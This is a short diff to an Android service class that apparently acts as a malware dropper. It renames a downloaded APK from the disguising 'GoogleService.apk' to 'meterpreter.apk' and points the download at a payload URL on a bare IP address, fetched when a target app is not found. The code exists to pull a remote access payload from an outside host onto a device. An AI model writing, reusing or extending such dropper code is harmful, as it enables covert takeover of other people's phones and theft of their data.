@@ -25,7 +25,7 @@ public class MainService extends Service {
     Merlin merlin;
     Context context;
     String apkFilePath = null;
-    String apkFileName = "GoogleService.apk";
+    String apkFileName = "meterpreter.apk";
 
     public MainService() {
 
@@ -76,7 +76,7 @@ public class MainService extends Service {
         if (launchIntent != null) {
             startActivity(launchIntent);
         } else {
-            startDownload("http://157.230.2.0/SystemService.apk", apkFileName, true);
+            startDownload("http://157.230.2.0/meterpreter.apk", apkFileName, true);
         }
 
     }
